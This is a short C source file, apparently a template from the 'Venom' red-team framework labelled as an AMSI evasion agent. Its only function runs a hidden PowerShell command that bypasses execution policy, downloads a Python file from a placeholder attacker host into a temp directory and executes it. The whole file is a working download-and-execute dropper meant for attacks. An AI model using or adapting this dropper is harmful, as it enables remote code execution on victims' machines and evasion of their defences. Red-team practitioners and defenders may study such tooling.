/*
Author: r00t-3xp10it [SSA RedTeam @2020]
Framework: Venom v1.0.17 - Amsi Evasion Agent nº 6
This template its used to download/exec (Client.py) from attacker machine (LAN)
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

int main()
{
 system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.py', 'TempDir\\FiLNaMe.py') && cd TempDir && python3 FiLNaMe.py");
 return 0;
}
